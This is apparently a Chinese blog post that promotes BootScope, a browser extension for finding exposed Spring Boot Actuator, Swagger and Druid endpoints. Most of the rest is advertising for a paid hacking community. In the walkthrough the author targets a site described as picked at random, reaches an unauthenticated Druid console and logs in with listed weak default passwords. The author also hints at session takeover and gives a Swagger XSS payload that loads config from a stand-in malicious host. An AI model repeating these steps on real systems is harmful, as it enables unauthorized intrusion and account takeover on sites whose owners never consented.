#  [工具推荐]一个面向 Spring Boot路径泄露/绕过的漏洞验证的浏览器扩展-BootScope  
原创 XiaoRoan
                    XiaoRoan  陌笙不太懂安全   2026-11-08 09:00  
  
免责声明  
```
由于传播、利用本公众号所提供的信息而造成
的任何直接或者间接的后果及损失，均由使用
者本人负责，公众号陌笙不太懂安全及作者不
为此承担任何责任，一旦造成后果请自行承担！
如有侵权烦请告知，我们会立即删除并致歉，谢谢！
```  
  
工具描述  
  
这是一款面向 Spring Boot 路径泄露/绕过漏洞验证的浏览器扩展，内置 67 条框架路径（覆盖 Actuator 2.x/3.x、Actuator 1.x、api-docs、Swagger UI、knife4j、Druid），对 13 条关键路径生成最多 30 个绕过与 URL 编码变体、其余 Actuator 路径最多 16 个编码/双重编码变体；支持从页面、资源请求、内联脚本及同源 JS 自动提取上下文路径并一键填入，可配置请求间隔与协议，自动识别 SPA 回退、软 404、全站统一 401/403 以降低误报，结果可一键导出 Markdown 或 CSV 报告，无需构建与后端，Chrome / Edge / Firefox 通用，默认仅发送只读 GET 且不带 Cookie，仅限授权目标使用。  
## 核心亮点  
- **67 条框架路径**  
：覆盖 Actuator 2.x/3.x、Actuator 1.x、api-docs、Swagger UI、doc/knife4j、Druid  
  
- **绕过 + URL 编码**  
：13 条关键路径最多 30 个变体；其余 Actuator 路径最多 16 个编码/双重编码变体  
  
- **低误报**  
：自动识别 SPA 回退、软 404、全站统一 401/403  
  
- **自行判断 baseURL 路径**  
：从页面、资源请求、内联脚本、同源 JS 里提取上下文路径，点击直接填入  
  
- **结果可留档**  
：一键导出 Markdown 报告或 CSV（Excel 中文兼容）  
  
- **加载即用**  
：无需构建、无需后端，Chrome / Edge / Firefox 通用  
  
## 功能概览  
### 1. 路径查找  
  
覆盖 Actuator 2.x/3.x、Actuator 1.x、api-docs、Swagger UI、doc/knife4j、Druid  
### 2. 自行判断 baseURL 路径  
  
打开弹窗时，插件会从以下来源提取可能的上下文路径：  
- 当前页面路径  
  
- DOM 标签：a、link、script、form、img、iframe、source、video  
  
- performance 里的 XHR / fetch / JS 资源  
  
- 内联脚本  
  
- 最多 8 个同源 JS 文件（每个 512KB）  
  
结果按来源加权、当前页面路径优先，按 origin 缓存 5 分钟。点击某个路径会直接填入：  
  
http(s)://当前host:端口/路径  
### 3. BaseURL 与协议  
- 留空：使用当前标签页的   
**host + 端口**  
（不继承当前页面路径）  
  
- 只填 host / host:port：与当前标签页同 host 时沿用其端口  
  
- 应用部署在上下文路径下：填 host/app，或直接点候选列表  
  
- http 勾选框：默认不勾选 = https://；勾选后强制 http://，会覆盖输入里的协议  
  
### 4. 执行节奏  
- 「每个路径 fuzz 后间隔」可选，单位秒，支持小数（如 0.3）  
  
- 填 1：每个路径（含该路径的变体）跑完等 1 秒；留空或 0 = 不限速  
  
- 间隔 > 0 时自动改为串行执行  
  
- 请求预算上限 1000  
  
工具安装  
  
首先下载插件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboT5JZw05WSB634jWnibeBApFCKFbOCIYicVMIHFJFRIIiasA2vU1oibcz6EicVMNbiaJGG4MkQZEHmecYzWUtqYrSvjecr46ea3GM3Yo/640?wx_fmt=png&from=appmsg "")  
  
直接下载下来就行，解压，然后使用浏览器，打开扩展即可  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboRMXLCIp4omvcHea9zF87KHBEQYLIxMibeH6C0b4gsENbSZ0R40Fc4tVppG6dvhVvzOrI9T29PKB6qBpHRCmjDkzMCv9BOOYQiaY/640?wx_fmt=png&from=appmsg "")  
  
成功之后是这样的  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboQMMfjBwSTyd4IymkI34csjSoNtxkvrzIgWk2bZveHBhrTia2MLEZibicbZWsa4HJLsPaSAqJVV5LwPe8Sw7HiaBtibIJ0rWVAtX1Bs/640?wx_fmt=png&from=appmsg "")  
  
工具使用  
  
比如实战过程中，我们遇到一个登录框，根据一些特征比如ico,接口啥的，看出来是ruoyi或者是spring相关的组件框架  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboQTsFfIA4CcSbYsAw0yyCIic1XYez8bOuswibyqYGXfD7Yo8IfEVUqRC1VSEIsGxGtMZBibDrOFicQNbqX6Iw6TGy0TKbeGrxK6fG4/640?wx_fmt=png&from=appmsg "")  
  
这个时候，我们就可以使用这个插件快速扫描泄露  
  
点击这个插件会自动给你判断二级路径  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboSU7F8kSWwEsyNkdjZmyMmlMuGSykV1a26uLCgRSW6Zu7m3m39FuNdicWzHFzuat4Pob0gJ45o6GJxoaZF0Jke2iba7kib722iaBwg/640?wx_fmt=png&from=appmsg "")  
  
然后你直接点击这个二级路径，就会拼接上去  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboSodLKlQba3mxb0qAU1k0JnibHoaFKoGfhvufmUGlgCICb5elGJnSzHA4oQQUlqayicrNojH0gahDYnbrpN08D4WGIG8X2eoxaM0/640?wx_fmt=png&from=appmsg "")  
  
这里我们看一手，他这里会统计路径出现的次数，我们可以根据出现的次数，进行猜测，也可以根据经验猜测，都没有的话可以多试几个二级路径  
  
比如我这里选择的是/prod-api这个接口，  
点击这个接口就会选中，然后给你拼接上去  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboRSWcC9r6SvHhjgEJK2xV1E5WIic4CIMnu7Noc7YSRj359Gf6zs0I5b6iasFR8bZGicY2gS7ibYhrJzqDiawDGCAibRBRyRLXvpjLSps/640?wx_fmt=png&from=appmsg "")  
  
点击运行就会开始扫描了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboTMAJoJsco1aRhqeolmC05nuSjVSHpChDUXCRib29lC3bylTttm4RP4fdMdfngmibvzKA3IDVTiaaibeCYVniaBIib8EaCHrcejiahZL0/640?wx_fmt=png&from=appmsg "")  
  
这里直接报错了，说目标不可达，师傅们使用的时候也要注意，因为这个插件是严格区分http和https站点的  
  
默认是https如果目标不可达，勾选http这个选项就行  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboTZGIDCRTfkkaUVXgfIsFJHwS9hOGTCaYU9ibdNM4CyBjicYSu9SX02KMFxrtqa2nBY3BosZ3Ao5B8SCWOSIRyicexTI4eZotRW3g/640?wx_fmt=png&from=appmsg "")  
  
现在点击运行，可以发现扫描成功  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboSB8l8BMuAtA5ThZyia5GAAarRr0xfBT8ibhOn4msPWicxschLrkEd2rWkqEO6Foxff2tQuX2xVROgBuJrJ2fTs6QrOtuBNZyAYjE/640?wx_fmt=png&from=appmsg "")  
  
成功扫描出了一些接口文档和druid页面，我们访问查看  
  
这里再推荐一下，这个插件，FeHelper，他会让你的json文档变得更加清晰  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboSicAY3oUTKSmRVFsv4I65f74Jwa2dBnknZh5F6qibHUUZM6Ad4HaODWiagDbcibmSqKjnQQnia1nHEpOI1W6F7JmxZACB6bBbdpumg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboSz4UacD4nfQycXWicwmKgooYGjtPFNUmAhgoVRnTjMezGCY7HjGJtecTw0qFzuYUR9NbNwnaMEWn759OXdFWPNvebTz1KMpP8E/640?wx_fmt=png&from=appmsg "")  
  
不用这个插件之前  
  
接口页面是这样的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboSbLicMYonW5rpO6mav3uDNmrPwJ5lFrQC1h9DSZibJAiaibU16eXwpiabAuPrSfyZPsZfmmgYkia3DgMoVA201cFex8ytOfRtd7jST8/640?wx_fmt=png&from=appmsg "")  
  
美化输出一下是这样  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboToVaSmjueNNHicDLMbm8GHKHUjlOcbKe36PyXM4oyAstEiaLD4ibLHO8SBARBnuG1SKFwavALqRsSJ6FaaD1LQ9TtsgpdgjwdEtE/640?wx_fmt=png&from=appmsg "")  
  
如果使用这个插件，可以直接给你美化  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboTvbu2nQCqqAdicicicCfljRUXNO4tLhaqO6oWjc4niaR1xhlY5LbfQMMgBDobhnGoO41GTcmRV8UVtGfRZkHWI5I1njQ78Pv7pWk8/640?wx_fmt=png&from=appmsg "")  
  
还有一些附件的小功能  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboQNkfb0R4LjfrAO5Pbb9Jd4hqDXVfyYmtIhpmA4wDyj30aBrz20uiaQhSS9r7XdzibrckyRHWialgLa9h1koBkN14q89ibSDbuWknw/640?wx_fmt=png&from=appmsg "")  
  
继续访问  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboRgjwy4Pox8ADEav97WGzX1tRjLFePIlfY3TO5J5C8ePjtyH4LXa7AsxobzXALtB7NYnLc5w5C4Daho4kGpRGjefC4XM98GuE8/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboQ2FMg0fCIeMSfAJkPKfIASLK7LA2Y0vxqfYYj9nMicS2AQxlKqx43KicEETtzoquBfTUF0mRDtGofiamLRLZib38yGdm8JeCpXDUo/640?wx_fmt=png&from=appmsg "")  
  
访问成功之后，发现并不是误报，如果是src或者一些项目，就可以吃点烂洞的钱了，后续就可以根据自己的经验扩大危害了  
  
根据文档该测接口测接口，该测组件测组件  
  
比如这个swagger的domxss  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboTeBL2cEkTQxONsDTEpNvXmj6LkrK3O8LpFP3W7GXH1tickSYLXnPjSa0C1hS9cALvnPqaYib0MN1W9aCbuBsz97DOeyX6aHMtJI/640?wx_fmt=png&from=appmsg "")  
  
类似这种的  
```
/swagger-ui.html?configUrl=https://malicious-site.com/test.json
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboS7u51wQsNKGjKKOiareCSkgy2cUtV1dfOiaiatibnXu1OHS5OSpIoXw4rgUsWkGl66kn9Nyrsz9FnYM01dWicTiaAicMJ0HjdhWOnRB8/640?wx_fmt=png&from=appmsg "")  
  
拼接之后，弹窗就说明存在  
  
比如druid这个的未授权漏洞以及弱口令漏洞  
  
因为这个站随便找的，脆的一批，访问/durid/index.html  
  
直接未授权进来了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboTmzyh6xJZP18uBEEjuMiciba2lWLsiaLMobSUkQH9FhU2BFbQ3Rgh6gLYebPtJxNnICmicJVib4qeOYibXgYkf4Ho3HjZIUVqYdbPCs/640?wx_fmt=png&from=appmsg "")  
  
然后试试弱口令  
  
admin/admin123  
  
admin/123456  
  
ruoyi/123456  
  
druid/druid  
  
第三组弱口令也是直接进去了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboQXiclPgNIRULklwXj9iazWh96npICyybgbWINImicpvzia0rpiaiaQcticPDtzGbibI4yzSBFlhW5zJKzW9RywOVC31EmzPwabIHDibILo/640?wx_fmt=png&from=appmsg "")  
  
session这里也有值，后续可以考虑接管，点到为止工具链接：https://github.com/XiaoRoan/BootScope  
  
  
  
**后台回复加群加入交流群**  
  
****  
**广告：********cisp pte/pts &nisp1级2级低价报考**  
  
  
**陌笙安全纷传圈子+陌笙src挖掘知识库+陌笙安全漏洞库+陌笙安全面试题库**  
**简单介绍****（**  
**加入纷传圈子**  
**送****知识库+漏洞库+面试题库****）**  
                          
  
如果觉得合适可以加入,圈子目前价格  
39.9元，价格只会根据圈子内容和圈子人数进行上调，不会下跌。。。    
  
  
**圈子福利**  
   
  
**edu漏洞挖掘1v1指导出洞**  
  
****  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboRKQWHxLsRrPqpqdiceX76d7yExQIyOqFmmJAfHQh7qzKvPc2V5z6iaa0RY6Ib8AsGvgS5MKkAk5aaHnJBaSnI10LDKQYMLcQMmg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboR8pnPeapLBK4Jsa4ufCvFoGL66t7PKeZyA3AjNxsObjtnCibN2gzGX7NMS7Wo5sj3YYL2iboeRuQDcWqiapc8xuo5fticoBG4DsyY/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboRKIBNIQIVicRWJLbyGRmg92vPzc8375PJpcYVvfywzwqnaeBicZuEbfvuic9KRdjwkahSDic5VqrH2Mb4NkqtkADl5HLIh8gPex60/640?wx_fmt=png&from=appmsg "")  
  
**skill+grok辅助挖掘某企业sr**  
**c****实战效果，能出但是重复多，agent独立挖掘也可以，见仁见智，看个人习惯，好的模型是最重要的。**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboQwyn779TTwY7vZkePQCL8k3K8dYxNdyzfgADL4dJcNUvpmodLeDVCZ6xDC4RJXEBmO2tcWqgUNdTVicKTW0jpdsg7X6xwP5gIQ/640?wx_fmt=png&from=appmsg "")  
  
****  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboQnIqagDL2A4BUIXrib9YVmATWuaIDqETqYd9ToHib52mDyoMyqc6Wzh733FRnbsDsGgey7B8s8jr72UtkPY6ich58niaPJqoItKcE/640?wx_fmt=png&from=appmsg "")  
  
****  
**企业src边缘&核心资产实战效果&&有重复但是证明好模型+AI确实够用**  
  
**（图片仅供参考，我出不等于你出，见识到ai神力即可，多去用AI!!!）**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboT1YNI9U6r6NMO4UMUBROoWeC4XQC4Dge94ODZ7tXY6tbxqb3IJoghve0u1SfkygE5UJ5HTdUBvLZKrn5ps13F71piax5dlHnOE/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboTGjdxKy4nllaLXIznTvRqicichITccuB8psYFRYakw6ViauCk6iccziahfPw4fnrqhyCp7Zkq7lRI0DOicyrZlNyicYibTVibfGFZVaG0c/640?wx_fmt=png&from=appmsg "")  
  
****  
**不是P图,单洞1.2w记录**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboQQpQdR2Ttwqxibyr75Is0kBG2N2tLYQIaau7SS278oyQ4RDpNScviaMt4wtlfgDCibE05WgoMhE5kZUrP8ciaYIdnxA594wsmoAAs/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboSRn2EsfFkA5mG6dcn7JLQMroc2dy3EQb3ueY2Cspd0WYgicXEnSF68UD43nNd4plkxmkTpEOh2kkQMEWZZIjE0ibA8r1q4IfiaxI/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboSexLYepQ2HCU6jVEiaS4UhZ4TItms5nzVGeTTIAgAzXe84dMZl36LsFIib3HxZdvtkNzdCKaS0RRJbczCQTtO1U9LG9NDwLxrvQ/640?wx_fmt=png&from=appmsg "")  
  
****  
**陌笙src挖掘知识库介绍（内容持续更新中!!!)**  
```
信息收集(主域名信息收集,子域名信息收集等&会永久提供fofa-key助力)
弱口令漏洞&未授权访问漏洞挖掘
任意文件读取&删除&下载&上传漏洞
sql注入漏洞
url重定向漏洞
csrf&ssrf漏洞挖掘
XSS&XXE漏洞挖掘等等常见漏洞
cors&目录遍历&越权漏洞挖掘
EDUSRC(证书站挖掘案例分享&edusrc挖掘技巧分享)
CNVD挖掘技巧分享&实战案例报告编写
公益漏洞挖掘（公益src挖掘漏洞分享&提供补天1权重资产）
SRC挖掘实战(针对各种常见功能总结的常见测试思路等快速提升)
经典常见Nday漏洞(常见中间件&以及各种常见框架)复现
云安全相关漏洞挖掘（云key扫盲&云存储桶&快速识别云环境&云攻防）
AI相关学习（AI基础&AI代码审计实战测试&webLLM攻击等）
APP&小程序漏洞挖掘
等各模块不在一一介绍
```  
  
信息收集  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboTu9DGyTubluhYicFynwVBKa4V06sDfEVKOyk5Q4ghZzLMDAuLb1M1oR4RJumGWrADPapFjTrOjpksKQ8q0YYCnl3ZWLof8Knzg/640?wx_fmt=png&from=appmsg "")  
  
src挖掘基础  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboR45bibbJEb28a1gS5yth3r5HyOsgPiaOUHHYriahZyIyrk0LMOsHW4VoDibyBRibTNzptGiaLWX62UwykicwvbxCJPopvklqiaxML8lS8/640?wx_fmt=png&from=appmsg "")  
  
src挖掘实战  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboTKWnTsN6CXf3djhXIlMKNRjVmJn3g5b23ur9E6Cx3O68f0hXVjCiaj8J4RYeTGBecqf1k99phG0ice2wtd5lKgR46OeqeLQfMpk/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboRbZ1HYm7R7YEiaxRVQibGWyricx9l7HpGjS4ZfWRdlft8iacwkpzYyZfmYEkWdJgYRORPkNFR6dADR5MyE524tWX6cAwN8MmrCZu0/640?wx_fmt=png&from=appmsg "")  
  
  
edusrc  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboQVVlTXhibjR8UiakZBQicXRZrQ7hdoOz5G8MQrcuDBGbqJdO0kIz6R9IU4ObAeOiabT8pr6lc7jibdIkKoTjiaXNHPLAwAB3BV2UvLM/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboSCrvarBbzP4L9kS6P0LVH9JMdmcbFDKiaicHqMFgTxq3x4iatjDJQicmc7NPC14C9Fk3icFjrouSgNVaN8Byuf0C0Iq9O6D1XPvFvY/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboRALwXmgZ4mh2LW0RdicrKjBCP7P1iaF14G0Eq2v3KRnTJORpwXZlF58WEz6QicxLJpyJaA5iah5CF2rHjBz4JzOELFRaZTAKOQ2tQ/640?wx_fmt=png&from=appmsg "")  
  
经典nday复现  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboRu8Gf849iaCkSBxLL8IlzJTRs185QicEe9l5UGI1dEVKISt2IGGveZynXBW9tIUsxNsz4adSTib7rib50uSJdjNfTvVRFrbPJhzL4/640?wx_fmt=png&from=appmsg "")  
  
  
云安全&AI安全  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboQ9qiavETNjaaX162czpNCqpw3uJqVpicbI15AXzhf5x8icmHxBdTGOgRgzNPGF3Aw2gglT4Fx09JGXYibQC6U7CQKVmoH08l3meia4/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboQgcsjiaZ4S26TWowHfpBkhSeHf2pjrcDyicJuia3uqvRBauLEOicibibEMqibnBMtjopFL8No7UXNibbURvzeJ3dQHTibvGxRQGnorb4co/640?wx_fmt=png&from=appmsg "")  
  
**陌笙安全漏洞库介绍**  
```
最新漏洞查看
1day&0day分享
EDU学校相关漏洞
Web应用漏洞
CMS漏洞
OA产品漏洞
中间件漏洞
云安全漏洞
人工智能漏洞
其他漏洞
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboTFBRMa8XwYxfcZMyXicx94xSKxawPcqFia2rJKOL7fSLYXiccwHc868XxNGIQ5z7ibiaI1MNAGRrK7U6wXJTsZOCAu2I5XV1boTAL4/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboSBzdakI9XI33ReAm2dxO8vgzw3JicQmUuWCb5ayBlKR1PoQHEHFETteBnicyupwU0mXvXibfrDoyg8nSWBGoK1p2YXY3ElhcvOQ0/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboSajCclDhuRpaLic9Ld915CHU7RqSC1LCrPGfNZiavdPEVeDedDWOPBhtMLCicTp3RNd1lT0Pmfo3mx5B0hUxbQg3ic6Via90NMtZVk/640?wx_fmt=png&from=appmsg "")  
  
****  
****  
**陌笙安全面试库**  
```
渗透测试基本问题一汇总
渗透测试基本问题二汇总
渗透测试基本问题三汇总
微步护网面试题目
长亭科技面试
深信服护网面试
启明星辰渗透测试面试题目
安恒面试题目
绿盟笔试题目
360面试
奇安信护网面试
运维面试题目
运维面试题库
网安面试相关文档大全
相关面试文章推荐
等等
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboSoLqEzH0a3A4LQrvTIkGx81Sh5pf6fCoEQJhYg715vrJicSkfBuCoAmV2Kp4uOMe5jcUZutPwicibFibtJ1ZmyiaAibCg0XicWnsNcicE/640?wx_fmt=png&from=appmsg "")  
  
****  
**POC库****&&更新适配afrog&&nuclei&&dddd的POC&1day/Nday等&&**  
**dddd二开****工具[助力渗透测试&&红蓝攻防]**  
  
**工具截图**  
  
****  
**实战效果**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboSKqLXNcOPE07xOwOUCjRGuFphopPumW9RaticmNCuEUXu52GtdTTfpTUicrBj80kMcZzJsnps3abyvXIvLHEIhvMoXUApOqZCe4/640?wx_fmt=png&from=appmsg "")  
  
****  
**poc库【后续持续更新】**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboTG9Lyp44aFffUOxQKtHjToGfqFWTjswYft0VtAPINtV5MqmrTTj8GWrVb6yowvHURubPgOqdribmibWEb0Fcj3YdN4iahUwItcxE/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboRAMJIIvexOOJa5KhrsKmlsx8bkwib9SPoK72Q0OSPWR5qx67yvl8scMQ5bg8caBXZH01kM39RDnKpnWSaTicgobRmLygERGFWls/640?wx_fmt=png&from=appmsg "")  
  
  
**AI赋能-**  
**skill辅助**  
**漏洞挖掘（免责&&慎用）**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboR3Dib0RVxVhUOzS6ibC6BvkfulXQAclic0XCXMS35C4EPoqX1b2eMVj2CFiaLCelVs1szGibaHiaAq7WibRdwHUg0IwO8fjDdWxNv6eY/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboSXZZVels2NibmHgyxntlCRNIkgoqMPfUPwSM9O43OqniaZLDEJic9QRkW01gNTydFkibdI6yBRkJJ1sDUmfl7iaicoibz1QLp0J2pWE4/640?wx_fmt=png&from=appmsg "")  
  
  
**圈友skill+ai辅助渗透**  
**实战效果**  
**，支持打假！**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboTeoic5S15BA8Ln4kjQfENmf6eDwrJzZntfWa8dT09ShNTQrTVuCA9KrKSluy1BWml6nxbia5tDW5fTaMsprQNDrr4MTBtCC9iaxk/640?wx_fmt=png&from=appmsg "")  
  
  
证书站  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboQibuxKAyHBZicB1t5yGVKyV82Teo8C2MbjKPytKziaXUcjPiao8ylHbD4vicAld8equC9alic3NksvWJ09wArXaPXZD10vjPtfoia4Vg/640?wx_fmt=png&from=appmsg "")  
  
普通站点  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboQ1Xt6gdLgd2d1mf8QURQX4YZjHA2uIw9GdTuxzSafBVOJzrQVmHJlqdhVWdVDj3OQsiaQhYOaoiabXc6EgajvBMvB6xBZwdJkIQ/640?wx_fmt=png&from=appmsg "")  
  
****  
**陌笙**  
**纷传****圈子介**  
**绍**  
```
1、src挖掘思维导图，信息收集思维导图，edusrc挖掘思维导图，以及后续的红队&面试思维导图&自己网安笔记等持续更新
2、2025-2026的edusrc实战报告包含证书站和非证书站以及2025之前的各种优质报思路分享
3、各种src报告思路分享（内部&外部）
4、分享各种src挖掘&edusrc挖掘培训资料&视频
5、不定期分享通杀、0day
6、有圈子群可以技术交流以及不定期抽取证书&免费rank
7.分享各种护网资料各家安全厂商讲解视频&精选实战面试题目
8、各种框架漏洞技巧分享
9、各种源码分享（泛微、正方系统、用友等）
10、漏洞挖掘工具&信息收集工具&内网渗透免杀等网安工具分享
11、各种ctf资料以及题目分享
12、cnvd挖掘技巧&CNVD资产&src资产分享&补天1权重资产分享&fofakey共用
13、免杀、逆向、红队攻内网防渗透等课程分享
14、漏洞库&字典以各种内容不在一一说明
15、cisp-pte/pts&nisp一级&nisp二级&edusrc证书内部价格
15、如果有漏洞挖掘问题或者工具资料需求可以找群主(尽量满足)
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboSY2pbvbP3qGAlW8O43bRvAISCxZm4UDTRsaMVbJKTsjfTMTDlq6qNBcVs4tkl4UzgqGz5ag81baU1rusKE09J9T6cMVliaibibwQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/MSDUaqtwboTrLRQpTicOR7bzyNiajiapVJgyMiaYlEDBVU87YXMnanOFWsCYN3cCVGsKkibzV9dMryvbFXBb4Z3472ib27RJ1Xq1HnKJIp5u49GYQ/640?wx_fmt=jpeg&from=appmsg "")  
  
**目前800多条内容，扫描下方二维码查看详情以及加入圈子，持续更新中。。**  
  
**如果觉得合适可以加入，价格不定期会根据圈子内容和圈子人数进行上调。。**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboRngNCK3ae5W1nw179icr078zj1eBrn2aP1FVic1yJHdvbJ1sIKcZzNKlhXsbTfcUYdo0miblHoJpdcfG10cZfp6HbbHQfkfiajU40/640?wx_fmt=png&from=appmsg "")  
  
